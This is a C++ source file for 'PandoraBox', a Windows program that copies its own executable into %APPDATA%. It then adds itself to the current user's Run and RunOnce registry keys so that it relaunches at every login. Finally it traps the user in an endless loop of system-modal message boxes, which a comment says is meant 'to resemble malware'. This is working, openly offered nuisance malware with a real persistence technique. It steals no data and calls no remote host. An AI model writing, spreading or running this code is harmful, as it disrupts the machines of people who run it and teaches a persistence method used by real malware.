#pragma once
#include "PandoraBox.h"
#include <Windows.h>
#include <winreg.h>
#include <filesystem>

PandoraBox::PandoraBox()
{
	// Save the exe file in %APPDATA% (AppData/Roaming) and then append /PandoraBox/PandoraBox.exe
	wchar_t buffer[MAX_PATH];
	DWORD result = ExpandEnvironmentStringsW(L"%APPDATA%", buffer, MAX_PATH);
	
	if (result == 0 || result > MAX_PATH) {
		return;
	}

	std::wstring exe_folder_path(buffer);
	exe_folder_path += L"\\" + app_name;

	exe_file_path = exe_folder_path + L"\\" + app_name + L".exe";

	if (!std::filesystem::exists(exe_folder_path)) {
		std::filesystem::create_directories(exe_folder_path);
	}

	if (!std::filesystem::exists(exe_file_path)) {
		wchar_t current_exe_path[MAX_PATH];
		GetModuleFileNameW(NULL, current_exe_path, MAX_PATH);

		std::filesystem::copy_file(current_exe_path, exe_file_path);
	}
}

void PandoraBox::CreateRegistryValues()
{
	// Create two registry keys one in Run, and one in RunOnce that their values
	// contain the exe file path that is being assigned in the constructor

	// Run key
	SetValueInRegistryKey(run_key_path, exe_file_path);

	// RunOnce key
	SetValueInRegistryKey(run_once_key_path, exe_file_path);
}

bool PandoraBox::AreValuesSet()
{
	return CheckValueInKey(run_key_path) && CheckValueInKey(run_once_key_path);
}

void PandoraBox::ShowPopupBox()
{
	if (!AreValuesSet()) {
		return;
	}

	std::wstring message = L"Oops! You shouldn't have opened the Pandora's Box... :)";

	// Run forever to resemble malware
	while (true) {
		MessageBoxExW(
			NULL,
			message.c_str(),
			app_name.c_str(),
			MB_OK | MB_SYSTEMMODAL,
			0
		);
	}
}

void PandoraBox::SetValueInRegistryKey(const std::wstring& registry_path, const std::wstring& value)
{
	HKEY hKey;

	LONG result = RegCreateKeyExW(
		HKEY_CURRENT_USER,
		registry_path.c_str(),
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_WRITE,
		NULL,
		&hKey,
		NULL
	);

	// if the key was created succesfully, set the value inside
	if (result == ERROR_SUCCESS) {
		RegSetValueExW(
			hKey,
			app_name.c_str(),
			0,
			REG_SZ,
			reinterpret_cast<const BYTE*>(value.c_str()),
			(value.length() + 1) * sizeof(wchar_t)
		);

		RegCloseKey(hKey);
	}
}

bool PandoraBox::CheckValueInKey(const std::wstring& path)
{
	wchar_t data[MAX_PATH];
	DWORD size = sizeof(data);
	DWORD type = 0;

	LONG result = RegGetValueW(
		HKEY_CURRENT_USER,
		path.c_str(),
		app_name.c_str(),
		RRF_RT_REG_SZ,
		&type,
		data,
		&size
	);

	if (result != ERROR_SUCCESS || type != REG_SZ) {
		return false;
	}

	// ensure that the value of the key is actually the exe file path
	return wcscmp(data, exe_file_path.c_str()) == 0;
}
